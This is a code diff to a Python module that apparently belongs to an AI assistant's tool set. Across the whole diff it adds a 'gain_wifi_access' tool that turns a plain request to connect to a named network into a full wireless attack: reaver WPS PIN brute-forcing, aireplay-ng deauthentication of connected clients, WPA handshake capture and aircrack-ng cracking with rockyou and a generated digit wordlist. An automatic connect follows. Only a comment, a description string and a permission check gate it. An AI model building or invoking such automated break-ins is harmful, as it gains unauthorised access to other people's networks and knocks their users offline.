@@ -3,6 +3,7 @@ from __future__ import annotations
 
 import logging
 import os
+import re
 import subprocess
 import time
 from pathlib import Path
@@ -340,3 +341,210 @@ def crack_handshake_auto(capture_file: str, bssid: str) -> str:
             Path(wordlist).unlink()
         except Exception:
             pass
+
+
+# ── Automatic access recovery (no password) ──────────────────────────────────
+# Orchestrates the primitives above so "connect to <ssid>" can recover a key
+# on its own when no saved profile exists: WPS first (fast), then handshake
+# capture + dictionary/auto cracking. Only networks you own or are authorised
+# to test.
+
+_ATTACK_BINS = ("airmon-ng", "airodump-ng", "aireplay-ng", "reaver", "aircrack-ng")
+
+
+def _dbm(power: str) -> int:
+    try:
+        return int((power or "").strip())
+    except ValueError:
+        return -1000
+
+
+def _airodump_scan(mon_iface: str, scan_seconds: int = 15) -> list[dict]:
+    """Run airodump-ng and return structured AP rows: {ssid, bssid, channel, enc, power}."""
+    import tempfile
+    with tempfile.TemporaryDirectory() as tmpdir:
+        prefix = os.path.join(tmpdir, "scan")
+        proc = subprocess.Popen(
+            ["sudo", "airodump-ng", "-w", prefix, "--output-format", "csv", mon_iface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        try:
+            time.sleep(min(scan_seconds, 30))
+        finally:
+            proc.terminate()
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+        csv_file = prefix + "-01.csv"
+        if not Path(csv_file).exists():
+            return []
+        lines = Path(csv_file).read_text(errors="replace").splitlines()
+
+    networks: list[dict] = []
+    in_ap = False
+    for line in lines:
+        if line.startswith("BSSID"):
+            in_ap = True
+            continue
+        if line.startswith("Station MAC"):
+            break
+        if not line.strip() or not in_ap:
+            continue
+        parts = [p.strip() for p in line.split(",")]
+        if len(parts) >= 14:
+            bssid, ch, enc, power, essid = parts[0], parts[3], parts[5], parts[8], parts[13]
+            networks.append({
+                "ssid": essid or "",
+                "bssid": bssid,
+                "channel": ch,
+                "enc": enc,
+                "power": _dbm(power),
+            })
+    networks.sort(key=lambda n: -n["power"])
+    return networks
+
+
+def _find_target_ap(ssid: str, networks: list[dict]) -> dict | None:
+    """Best AP match for a user-supplied SSID (exact, then containment by signal)."""
+    t = ssid.strip().lower()
+    for n in networks:
+        if n["ssid"].lower() == t:
+            return n
+    best: dict | None = None
+    for n in networks:
+        sl = n["ssid"].lower()
+        if sl and (t in sl or sl in t) and (best is None or n["power"] > best["power"]):
+            best = n
+    return best
+
+
+def _wps_psk(mon_iface: str, bssid: str, channel: str) -> str | None:
+    """Attempt a WPS PIN attack with reaver; return the recovered PSK or None."""
+    r = _sudo("reaver", "-i", mon_iface, "-b", bssid, "-c", channel,
+              "-vv", "-t", "5", "-d", "1", timeout=120)
+    out = r.stdout + r.stderr
+    m = re.search(r"WPA PSK\s*[:=]\s*['\"]?([^'\"\s]+)", out)
+    return m.group(1) if m else None
+
+
+def _capture_handshake_file(mon_iface: str, bssid: str, channel: str) -> str | None:
+    """Capture a WPA handshake; return the .cap path, or None on failure."""
+    prefix = os.path.join("/tmp", f"plia_{bssid.replace(':', '')}")
+    dump_proc = subprocess.Popen(
+        ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", prefix, mon_iface],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+    )
+    try:
+        time.sleep(5)
+        _sudo("aireplay-ng", "-0", "5", "-a", bssid, mon_iface, timeout=20)
+        time.sleep(10)
+    finally:
+        dump_proc.terminate()
+        try:
+            dump_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            dump_proc.kill()
+    cap_file = prefix + "-01.cap"
+    if Path(cap_file).exists() and Path(cap_file).stat().st_size > 0:
+        return cap_file
+    return None
+
+
+def _aircrack_psk(capture_file: str, bssid: str, wordlist: str) -> str | None:
+    """Crack a capture with a wordlist; return the PSK or None."""
+    r = _run("aircrack-ng", capture_file, "-b", bssid, "-w", wordlist, timeout=600)
+    out = r.stdout + r.stderr
+    for line in out.splitlines():
+        if "KEY FOUND" in line:
+            m = re.search(r"\[(.+?)\]", line)
+            return m.group(1).strip() if m else "found"
+    return None
+
+
+def _crack_with_wordlists(capture_file: str, bssid: str) -> str | None:
+    """Try rockyou.txt, then an auto-generated digits-only wordlist."""
+    if Path(_ROCKYOU).exists():
+        psk = _aircrack_psk(capture_file, bssid, _ROCKYOU)
+        if psk:
+            return psk
+    if _bin_missing("crunch") is None:
+        wl = f"/tmp/plia_auto_{bssid.replace(':', '')}.txt"
+        gen = _run("crunch", "8", "10", "0123456789", "-o", wl, timeout=60)
+        if gen.returncode == 0:
+            try:
+                return _aircrack_psk(capture_file, bssid, wl)
+            finally:
+                try:
+                    Path(wl).unlink()
+                except Exception:
+                    pass
+    return None
+
+
+def _stop_monitor(mon_iface: str) -> None:
+    """Restore managed mode and NetworkManager after a monitor-mode session."""
+    if not mon_iface or _detect_monitor_interface() is None:
+        return
+    _sudo("airmon-ng", "stop", mon_iface, timeout=15)
+    _sudo("systemctl", "restart", "NetworkManager", timeout=10)
+
+
+@tool(description="Obtain access to a WiFi network when you don't have its password, using WPS first and then a WPA handshake capture + crack. Connects automatically if a key is recovered. Use only on networks you own or have explicit permission to test. Requires Admin + the Wireless Tools grant.")
+def gain_wifi_access(ssid: str, interface: str = "") -> str:
+    ssid = (ssid or "").strip()
+    if not ssid:
+        return "ssid is required."
+    if not _has_wireless_admin():
+        return (
+            "Permission denied. Set the Wireless Tools to Admin in Settings → Permissions "
+            "and run the grant command shown there, then retry."
+        )
+    missing = [b for b in _ATTACK_BINS if _bin_missing(b)]
+    if missing:
+        return f"Missing tools: {', '.join(missing)}. Run install_wireless_tools first."
+
+    iface = interface or _detect_wifi_interface()
+    if not iface:
+        return "No WiFi interface found. Specify one explicitly."
+
+    mon = _detect_monitor_interface()
+    if not mon:
+        r = _sudo("airmon-ng", "start", iface, timeout=15)
+        if r.returncode != 0:
+            return f"Could not start monitor mode on {iface}: {(r.stdout + r.stderr).strip()}"
+        mon = _detect_monitor_interface() or iface + "mon"
+
+    recovered: str | None = None
+    method = ""
+    failure = ""
+    try:
+        ap = _find_target_ap(ssid, _airodump_scan(mon, 15))
+        if ap is None:
+            failure = f"Could not find '{ssid}' in range (monitor scan)."
+        else:
+            bssid, channel = ap["bssid"], ap["channel"]
+            recovered = _wps_psk(mon, bssid, channel)
+            if recovered:
+                method = "WPS"
+            else:
+                cap = _capture_handshake_file(mon, bssid, channel)
+                if cap is None:
+                    failure = f"No handshake captured for '{ssid}'. A client must (re)connect during capture."
+                else:
+                    recovered = _crack_with_wordlists(cap, bssid)
+                    if recovered:
+                        method = "handshake cracking"
+                    else:
+                        failure = (
+                            f"Handshake captured at {cap} but the key was not in the default "
+                            "wordlists. Run crack_handshake_wordlist with a better wordlist."
+                        )
+    finally:
+        _stop_monitor(mon)
+
+    if recovered:
+        from modules.network_tools import connect_wifi
+        connect_result = connect_wifi(ssid, iface, recovered)
+        return f"Recovered the key for '{ssid}' via {method}. {connect_result}"
+    return failure or f"Could not obtain access to '{ssid}'."
